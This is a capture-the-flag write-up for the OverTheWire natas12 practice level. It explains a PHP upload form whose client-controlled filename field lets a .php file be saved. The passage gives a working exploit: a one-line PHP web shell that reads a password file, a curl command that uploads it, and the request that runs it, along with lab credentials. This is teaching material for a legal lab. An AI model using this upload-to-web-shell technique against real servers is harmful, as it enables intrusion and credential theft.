### natas12 pswd: yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB

```bash
curl  -s  http://natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB@natas12.natas.labs.overthewire.org

<html>
<body>
<h1>natas12</h1>
<div id="content">

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="7bc2mn5o3c.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

getting the code

```bash
curl  -s  http://natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB@natas12.natas.labs.overthewire.org/index-source.html | w3m -dump -T text/html

<html>
<body>
<h1>natas12</h1>
<div id="content">
<?php

function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

function makeRandomPath($dir, $ext) {
    do {
    $path = $dir."/".genRandomString().".".$ext;
    } while(file_exists($path));
    return $path;
}

function makeRandomPathFromFilename($dir, $fn) {
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

if(array_key_exists("filename", $_POST)) {
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


        if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path
)) {
            echo "The file <a href=\"$target_path\">$target_path</a>
 has been uploaded";
        } else{
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>
.jpg" />
Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
</div>
</body>
</html>
```

The php code with comments:

```php
<?php

// helper: genRandomString
// The developer wants to ensure that uploaded files don't overwrite each other.
// So, instead of keeping the file's original name, they generate a random 10-character string.
function genRandomString() {
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";

    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }

    return $string;
}

// helper: makeRandomPath (using the genRandomString helper)
// This takes a directory (like "upload") and an extension (like "jpg").
// It combines them: upload/ + <random_string> + . + jpg
function makeRandomPath($dir, $ext) {
    do {
        $path = $dir."/".genRandomString().".".$ext;
    // It loops just in case it accidentally generates a string that already exists.
    } while(file_exists($path)); 
    return $path;
}

// makeRandomPathFromFilename 
// takes the $dir (upload dir) and $fn (filename) profided by user
// keeps only the extension of $fn (here is our attack vector)
// and passes it to `makeRandomPath` to create the final path.
function makeRandomPathFromFilename($dir, $fn) {
    // pathinfo() extracts just the extension. E.g., "picture.jpg" -> "jpg"
    $ext = pathinfo($fn, PATHINFO_EXTENSION);
    return makeRandomPath($dir, $ext);
}

// ---------------------------------------------
// MAIN SCRIPT EXECUTION STARTS HERE
// ---------------------------------------------

// Did the user submit the form? 
// It checks for the hidden "filename" field from the HTML form.
if(array_key_exists("filename", $_POST)) {
    
    // The script builds the destination path using $_POST["filename"].
    // It completely trusts the hidden form field rather than checking the actual uploaded file.
    $target_path = makeRandomPathFromFilename("upload", $_POST["filename"]);


    // Check if the uploaded file is larger than 1KB (1000 bytes)
    if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) {
        echo "File is too big";
    } else {
        
        // move_uploaded_file() takes the temporary file from the server's RAM/tmp folder
        // and saves it permanently into the "upload/" directory using the path generated above.
        if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) {
            
            // If successful, it prints a clickable link to your uploaded file!
            echo "The file <a href=\"$target_path\">$target_path</a> has been uploaded";
        } else {
            echo "There was an error uploading the file, please try again!";
        }
    }
} else {
// If the form hasn't been submitted yet, show the HTML form below:
?>

<form enctype="multipart/form-data" action="index.php" method="POST">
<!-- Max file size directive for the browser -->
<input type="hidden" name="MAX_FILE_SIZE" value="1000" />

<!-- 
    THE SMOKING GUN:
    The developer generates a random name and extension (.jpg) right here in the HTML form.
    Because it is an <input> field, it is controlled by YOUR browser, not the server.
-->
<input type="hidden" name="filename" value="<?php print genRandomString(); ?>.jpg" />

Choose a JPEG to upload (max 1KB):<br/>
<input name="uploadedfile" type="file" /><br />
<input type="submit" value="Upload File" />
</form>
<?php } ?>
```

## The exploit

1. create a tiny php script that reads and prints the natas13 password:

```bash
echo '<?php passthru("cat /etc/natas_webpass/natas13"); ?>' > natas13psw.php

# verify
cat natas13psw.php 
# <?php passthru("cat /etc/natas_webpass/natas13"); ?>
```

2. we upload this tiny *.php* instead of a *.jpg*.
> **Note**: we also need to change the **hidden filename field** so it ends in *.php* instead of *.jpg*.

```bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB \
-F "uploadedfile=@natas13psw.php" \
-F "filename=natas13psw.php" \
natas12.natas.labs.overthewire.org/index.php

# <html>
# <body>
# <h1>natas12</h1>
# <div id="content">
# The file <a href="upload/jr3rokqgdr.php">upload/jr3rokqgdr.php</a> has been uploaded<div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
# </div>
# </body>
# </html>
```

Now we just have to "view" the uploaded file randomly renamed to `upload/jr3rokqgdr.php` and it will display us the natas13 psw:

```bash
curl -u natas12:yZdkjAYZRd3R7tq7T5kXMjMJlOIkzDeB \
natas12.natas.labs.overthewire.org/upload/jr3rokqgdr.php 
# trbs5pCjCrkuSknBBKHhaBxq6Wm1j3LC
```
